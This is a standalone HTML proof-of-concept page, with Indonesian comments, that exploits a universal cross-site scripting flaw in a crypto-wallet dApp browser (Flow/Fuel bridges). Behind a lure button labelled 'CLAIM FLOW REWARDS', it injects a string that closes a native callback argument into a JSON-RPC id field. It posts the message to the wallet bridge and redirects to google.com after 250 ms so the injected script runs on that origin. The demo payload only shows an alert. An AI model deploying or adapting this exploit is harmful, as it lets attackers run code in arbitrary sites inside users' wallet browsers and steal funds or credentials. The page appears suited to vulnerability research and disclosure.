<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>PoC UXSS Bypass</title>
    <style>
        body { background: #0b0e11; color: #00ef8b; text-align: center; font-family: sans-serif; padding-top: 100px; }
        .btn { background: #00ef8b; color: #000; padding: 20px 40px; border: none; border-radius: 12px; font-weight: bold; font-size: 1.2rem; cursor: pointer; box-shadow: 0 4px 15px rgba(0,239,139,0.3); }
        .btn:active { transform: scale(0.98); }
    </style>
</head>
<body>
    <h1>Flow dApp Browser</h1>
    <p>Klik tombol di bawah untuk memicu klaim hadiah:</p>
    
    <button class="btn" onclick="triggerBypass()">CLAIM FLOW REWARDS</button>

    <script>
        function triggerBypass() {
            // 1. Target situs di mana alert akan muncul (Origin Korban)
            const victimSite = "https://www.google.com";

            // 2. PAYLOAD SEMPURNA:
            // "); -> Menutup argumen pertama fungsi receiveResponseFromFlutter
            // alert(origin); -> Perintah yang akan dijalankan di situs korban
            // // -> Menghapus sisa kode native agar tidak terjadi Syntax Error
            const maliciousId = '");alert("UXSS SUCCESS!\\nExecuted on: "+origin);//';

            // 3. Pesan JSON yang memicu kerentanan pada idfield
            const payload = JSON.stringify({
                type: 'request',
                target: 'FuelContentScript',
                request: {
                    jsonrpc: '2.0',
                    id: maliciousId, // Injeksi pada idfield
                    method: 'connect',
                    params: {}
                }
            });

            // 4. Kirim ke semua kemungkinan jembatan (bridge) dompet
            const walletBridge = window.FueletWallet || window.flow || window.fcl || window.FlowWallet;

            if (walletBridge) {
                // Kirim permintaan jahat
                walletBridge.postMessage(payload);

                // 5. TIMING KRUSIAL (200ms - 300ms)
                // Kita harus berpindah halaman tepat sebelum aplikasi Native membalas
                setTimeout(() => {
                    window.location.href = victimSite;
                }, 250); 
            } else {
                alert("Gagal: Objek Wallet tidak terdeteksi. Gunakan Browser Dompet!");
            }
        }
    </script>
</body>
</html>
